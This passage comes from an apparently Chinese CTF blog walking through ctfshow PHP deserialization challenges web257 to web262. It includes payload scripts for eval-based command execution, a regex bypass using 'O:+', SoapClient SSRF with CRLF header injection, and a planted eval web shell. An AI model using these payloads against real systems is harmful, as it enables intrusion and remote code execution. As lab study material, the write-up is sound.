class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这个题第一次遇到了魔术方法， 由于存在 backDoor 类，里面有可以进行 RCE 的点，所以，这里可以想办法触发 <code>__construct</code>  方法以及修改参数来创建这个类，但是，由于 info 类和 backDoor 类都有一个同名的方法，就是 getInfo，所以在脚本结束的时候，也就是释放或者销毁类的时候就会调用 <code>__destruct</code>  方法， 然后调用到 backDoor 类里的 getInfo 方法进行 RCE。生成 payload 的脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = <span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span> = <span class="string">&quot;system(&#x27;tac flag.php&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web258"><a class="markdownIt-Anchor" href="#web258">#</a> web258：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这个题对比上一题，多了个正则过滤，基本上就是过滤了 o: 数字 以及 c: 数字 ，这种形式，这里可以使用加号绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = <span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;system(&#x27;tac fl*&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;O:&quot;</span>,<span class="string">&quot;O:+&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>​这个构造我踩了不少坑，最严重的是 system 函数后面，没有加分号，这个是最大的问题，我一直以为没有成功，结果是因为每家分号。</p><h1 id="web259"><a class="markdownIt-Anchor" href="#web259">#</a> web259：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></figure><p>​这个题给的信息好少，不会做，看下 wp。</p><p>​这一题主要考察了原生类的反序列化，好吧，第一次遇到完全想不到，即使学了原生类也没想到。</p><p>​由于整个 index 里面没有任何类，所以后面的反序列化加上 $vip-&gt;getFlag (); 给人第一反应应该是调用了一个不存在的方法以及原生类结合，触发 <code>__call</code>  魔术方法，</p><p>​贴一个链接，这个文章感觉很详细：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1cHBpZTAwMS9hcnRpY2xlL2RldGFpbHMvMTM5ODY1NTA1P29wc19yZXF1ZXN0X21pc2M9JTI1N0IlMjUyMnJlcXVlc3QlMjU1RmlkJTI1MjIlMjUzQSUyNTIyOEZGNkI0MEItMkJDMS00MjAxLTg3MTgtMUQyMzE4MUEwRDY0JTI1MjIlMjUyQyUyNTIyc2NtJTI1MjIlMjUzQSUyNTIyMjAxNDA3MTMuMTMwMTAyMzM0Li4lMjUyMiUyNTdEJmFtcDtyZXF1ZXN0X2lkPThGRjZCNDBCLTJCQzEtNDIwMS04NzE4LTFEMjMxODFBMEQ2NCZhbXA7Yml6X2lkPTAmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19zZWFyY2hfcmVzdWx0Lm5vbmUtdGFzay1ibG9nLTJ+YWxsfnNvYmFpZHVlbmR+ZGVmYXVsdC0yLTEzOTg2NTUwNS1udWxsLW51bGwuMTQyJTVFdjEwMCU1RXBjX3NlYXJjaF9yZXN1bHRfYmFzZTYmYW1wO3V0bV90ZXJtPVNvYXBDbGllbnQlRTUlOEUlOUYlRTclOTQlOUYlRTclQjElQkImYW1wO3NwbT0xMDE4LjIyMjYuMzAwMS40MTg3">【靶场】ctfshow 详解 web259 原生类反序列化</span></p><p>​这里是使用的 Soapclient 原生类：</p><blockquote><p><strong>Soapclient 原生类主要作用是使 PHP 应用程序能够方便地调用远程的 SOAP 服务</strong></p><p><strong>SoapClient 原生类，类似于 curl 一样的存在，基于 XML 的协议，它使应用程序通过 HTTP 来交换信息</strong></p></blockquote><p>​提示里给了这个：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flag.php</span><br><span class="line"> </span><br><span class="line"><span class="variable">$xff</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这里可以看出来，flag,php 文件会帮我们获得 flag 的值，但是，需要提前检测 ip，也就是 xff 的值。</p><p>​从代码上看直接访问 flag.php 给 X_FORWARDED_FOR 赋值 127.0.0.1 三次 (127.0.0.1, 127.0.0.1,  127.0.0.1) 就可以绕过 array_pop (删除数组末尾的值), 在传入 token 等于 ctfshow 就能得到 flag</p><p>​所以，构造 payload 的脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ua</span> = <span class="string">&quot;ceshi\r\nX-Forwarded-For: 127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/&#x27;</span> , <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span> , <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$ua</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$client</span>));</span><br></pre></td></tr></table></figure><p>​完成上面的生成操作得安装 php-soap 拓展，我这里用的是 phpstudy，它自带这个拓展，但是没有编译。打开 php-ini，找到 extension=php_soap.dll，把前面的分号去掉。</p><p>​之后得到的 payload 发送之后直接读取 flag.txt 即可。</p><h1 id="web260"><a class="markdownIt-Anchor" href="#web260">#</a> web260：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​ 没搞懂这个题的意义是啥，算了无脑了：get 传一个 ctfshow=ctfshow_i_love_36D 即可得到 flag。</p><h1 id="web261"><a class="markdownIt-Anchor" href="#web261">#</a> web261：</h1><p>​提示里出现了个打 redis，有点害怕了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>​先扔一个考点：</p><blockquote><p>如果类中同时定义了 __unserialize () 和 __wakeup () 两个魔术方法， 则只有 __unserialize () 方法会生效，__wakeup () 方法会被忽略。</p></blockquote><p>​所以不用搭理 <code>__wakeup</code>  直接打木马：</p><p>​因为存在 file_put_contents，所以只需要将木马写入文件里即可，然后就是 <code>__destruct</code> ，在脚本跑完的时候会自动执行，所以完全可以触发，之后，有一个 if ($this-&gt;code==0x36d ，需要想办法通过，因为是弱比较，所以可以利用这个 PHP 的特性，先执行下这个：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">0x36d</span> == <span class="string">&quot;877.php&quot;</span>;</span><br></pre></td></tr></table></figure><p>​发现输出结果是 1，好了，可以直接梭了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;877.php&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&lt;?php eval($_GET[1]);?&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowvip</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>​之后访问 877.php 直接 RCE 即可。</p><h1 id="web262"><a class="markdownIt-Anchor" href="#web262">#</a> web262：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@message</span>.php</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span 